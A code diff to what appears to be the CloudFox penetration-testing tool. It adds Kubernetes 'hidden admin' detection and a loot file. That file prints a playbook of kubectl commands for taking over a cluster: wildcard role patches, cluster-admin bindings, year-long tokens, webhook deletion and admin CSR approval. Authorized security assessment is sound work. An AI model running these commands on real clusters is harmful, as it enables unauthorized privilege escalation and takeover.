@@ -79,6 +79,7 @@ type WhoamiModule struct {
 	PrivEscPaths      []attackpathservice.AttackPath
 	LateralPaths      []attackpathservice.AttackPath
 	ExfilPaths        []attackpathservice.AttackPath
+	HiddenAdminPaths  []attackpathservice.AttackPath
 	ImpersonationInfo []ImpersonationTarget
 
 	// Loot files
@@ -157,6 +158,9 @@ func Whoami(cmd *cobra.Command, args []string) {
 
 		// Identify data exfiltration paths
 		module.identifyExfilPaths(ctx, logger)
+
+		// Identify hidden admin paths (IAM/RBAC escalation)
+		module.identifyHiddenAdminPaths(ctx, logger)
 
 		// Identify impersonation targets
 		module.identifyImpersonationTargets(logger)
@@ -344,6 +348,60 @@ func (m *WhoamiModule) identifyExfilPaths(ctx context.Context, logger internal.L
 	}
 }
 
+// identifyHiddenAdminPaths finds hidden admin paths (IAM/RBAC escalation) from current identity's permissions
+func (m *WhoamiModule) identifyHiddenAdminPaths(ctx context.Context, logger internal.Logger) {
+	if m.Result == nil || len(m.Result.Permissions.PermissionsWithSource) == 0 {
+		return
+	}
+
+	// Check permissions against hidden admin permission list
+	hiddenAdminPerms := attackpathservice.GetHiddenAdminPermissions()
+
+	for _, perm := range m.Result.Permissions.PermissionsWithSource {
+		for _, hiddenAdmin := range hiddenAdminPerms {
+			// Match verb
+			if perm.Verb != hiddenAdmin.Verb && perm.Verb != "*" && hiddenAdmin.Verb != "*" {
+				continue
+			}
+			// Match resource
+			if perm.Resource != hiddenAdmin.Resource && perm.Resource != "*" && hiddenAdmin.Resource != "*" {
+				continue
+			}
+			// Match API group (empty string matches core API group)
+			permAPIGroup := perm.APIGroup
+			if permAPIGroup == "" {
+				permAPIGroup = ""
+			}
+			if permAPIGroup != hiddenAdmin.APIGroup && permAPIGroup != "*" && hiddenAdmin.APIGroup != "*" {
+				continue
+			}
+
+			// Found a match - create attack path
+			path := attackpathservice.AttackPath{
+				Principal:      orUnknown(m.Result.Identity.Username),
+				PrincipalType:  "User",
+				Method:         hiddenAdmin.Category,
+				TargetResource: hiddenAdmin.Resource,
+				Permissions:    []string{fmt.Sprintf("%s %s", perm.Verb, perm.Resource)},
+				Category:       hiddenAdmin.Category,
+				RiskLevel:      hiddenAdmin.RiskLevel,
+				Description:    hiddenAdmin.Description,
+				ExploitCommand: generateWhoamiExploitCommand("hiddenadmin", perm.Verb, hiddenAdmin.Resource, perm.Namespace),
+				ScopeName:      perm.Namespace,
+				PathType:       "hiddenadmin",
+			}
+			if perm.Namespace == "" || perm.Namespace == "*" {
+				path.ScopeType = "cluster"
+			}
+			m.HiddenAdminPaths = append(m.HiddenAdminPaths, path)
+		}
+	}
+
+	if len(m.HiddenAdminPaths) > 0 {
+		logger.InfoM(fmt.Sprintf("[HIDDEN-ADMIN] Found %d hidden admin path(s) for current identity", len(m.HiddenAdminPaths)), globals.K8S_WHOAMI_MODULE_NAME)
+	}
+}
+
 // identifyImpersonationTargets finds service accounts that can be impersonated
 func (m *WhoamiModule) identifyImpersonationTargets(logger internal.Logger) {
 	// Check dangerous permissions for impersonation capabilities
@@ -516,6 +574,7 @@ func (m *WhoamiModule) buildIdentityTable() internal.TableFile {
 		body = append(body, []string{"Privilege Escalation Paths", fmt.Sprintf("%d", len(m.PrivEscPaths))})
 		body = append(body, []string{"Lateral Movement Paths", fmt.Sprintf("%d", len(m.LateralPaths))})
 		body = append(body, []string{"Data Exfiltration Paths", fmt.Sprintf("%d", len(m.ExfilPaths))})
+		body = append(body, []string{"Hidden Admin Paths", fmt.Sprintf("%d", len(m.HiddenAdminPaths))})
 		body = append(body, []string{"Impersonation Capabilities", fmt.Sprintf("%d", len(m.ImpersonationInfo))})
 	}
 
@@ -688,8 +747,14 @@ func (m *WhoamiModule) generateLoot() []internal.LootFile {
 
 	// Extended mode loot files with exploitation commands
 	if m.Extended {
+		identityHeader := fmt.Sprintf("Identity: %s", orUnknown(m.Result.Identity.Username))
+
 		if len(m.PrivEscPaths) > 0 {
-			privescLoot := m.generatePrivescLoot()
+			// Use centralized playbook with fallback
+			privescLoot := attackpathservice.GeneratePrivescPlaybook(m.PrivEscPaths, identityHeader)
+			if privescLoot == "" {
+				privescLoot = m.generatePrivescLoot()
+			}
 			lootFiles = append(lootFiles, internal.LootFile{
 				Name:     "Whoami-Privesc",
 				Contents: privescLoot,
@@ -697,7 +762,11 @@ func (m *WhoamiModule) generateLoot() []internal.LootFile {
 		}
 
 		if len(m.LateralPaths) > 0 {
-			lateralLoot := m.generateLateralLoot()
+			// Use centralized playbook with fallback
+			lateralLoot := attackpathservice.GenerateLateralPlaybook(m.LateralPaths, identityHeader)
+			if lateralLoot == "" {
+				lateralLoot = m.generateLateralLoot()
+			}
 			lootFiles = append(lootFiles, internal.LootFile{
 				Name:     "Whoami-Lateral-Movement",
 				Contents: lateralLoot,
@@ -705,10 +774,23 @@ func (m *WhoamiModule) generateLoot() []internal.LootFile {
 		}
 
 		if len(m.ExfilPaths) > 0 {
-			exfilLoot := m.generateExfilLoot()
+			// Use centralized playbook with fallback
+			exfilLoot := attackpathservice.GenerateExfilPlaybook(m.ExfilPaths, identityHeader)
+			if exfilLoot == "" {
+				exfilLoot = m.generateExfilLoot()
+			}
 			lootFiles = append(lootFiles, internal.LootFile{
 				Name:     "Whoami-Data-Exfil",
 				Contents: exfilLoot,
+			})
+		}
+
+		if len(m.HiddenAdminPaths) > 0 {
+			// Generate hidden admin playbook
+			hiddenAdminLoot := m.generateHiddenAdminLoot()
+			lootFiles = append(lootFiles, internal.LootFile{
+				Name:     "Whoami-Hidden-Admin",
+				Contents: hiddenAdminLoot,
 			})
 		}
 
@@ -934,6 +1016,79 @@ func (m *WhoamiModule) generateImpersonationLoot() string {
 		}
 		content.WriteString("\n")
 	}
+
+	return content.String()
+}
+
+func (m *WhoamiModule) generateHiddenAdminLoot() string {
+	var content strings.Builder
+	content.WriteString(`# Whoami - Hidden Admin Paths
+# Generated by CloudFox
+# WARNING: Only use with proper authorization!
+
+# Hidden admin paths are permissions that allow indirect cluster takeover
+# through IAM/RBAC manipulation without direct cluster-admin access.
+
+`)
+	content.WriteString(fmt.Sprintf("## Found %d hidden admin path(s)\n\n", len(m.HiddenAdminPaths)))
+
+	for _, path := range m.HiddenAdminPaths {
+		content.WriteString(fmt.Sprintf("### %s\n", path.Method))
+		content.WriteString(fmt.Sprintf("# Scope: %s\n", path.ScopeName))
+		content.WriteString(fmt.Sprintf("# Target: %s\n", path.TargetResource))
+		content.WriteString(fmt.Sprintf("# Description: %s\n", path.Description))
+		content.WriteString(fmt.Sprintf("%s\n\n", path.ExploitCommand))
+	}
+
+	// Add general hidden admin techniques
+	content.WriteString(`
+## General Hidden Admin Techniques
+
+### RBAC Manipulation
+# Escalate by modifying cluster roles
+kubectl patch clusterrole <role-name> --type='json' -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'
+
+# Create new admin binding
+kubectl create clusterrolebinding my-admin --clusterrole=cluster-admin --user=<username>
+kubectl create clusterrolebinding my-admin --clusterrole=cluster-admin --serviceaccount=<namespace>:<sa-name>
+
+# Modify existing binding to add yourself
+kubectl patch clusterrolebinding <binding-name> --type='json' -p='[{"op":"add","path":"/subjects/-","value":{"kind":"ServiceAccount","name":"<sa-name>","namespace":"<namespace>"}}]'
+
+### Token Request Escalation
+# Create long-lived token for any service account
+kubectl create token <sa-name> -n <namespace> --duration=8760h
+
+# Create token with audience for external use
+kubectl create token <sa-name> -n <namespace> --audience=api --duration=8760h
+
+### Admission Controller Manipulation
+# If you can modify validating/mutating webhooks
+kubectl get validatingwebhookconfigurations
+kubectl get mutatingwebhookconfigurations
+
+# Delete admission controls to bypass restrictions
+kubectl delete validatingwebhookconfiguration <name>
+
+### ServiceAccount Token Mounting
+# Create pod with privileged SA token
+kubectl run privpod --image=alpine --overrides='{"spec":{"serviceAccountName":"<admin-sa>"}}'
+
+### Certificate Signing
+# If you can approve CSRs, create admin certificate
+cat <<EOF | kubectl apply -f -
+apiVersion: certificates.k8s.io/v1
+kind: CertificateSigningRequest
+metadata:
+  name: my-admin-csr
+spec:
+  request: <base64-encoded-csr>
+  signerName: kubernetes.io/kube-apiserver-client
+  usages:
+  - client auth
+EOF
+kubectl certificate approve my-admin-csr
+`)
 
 	return content.String()
 }
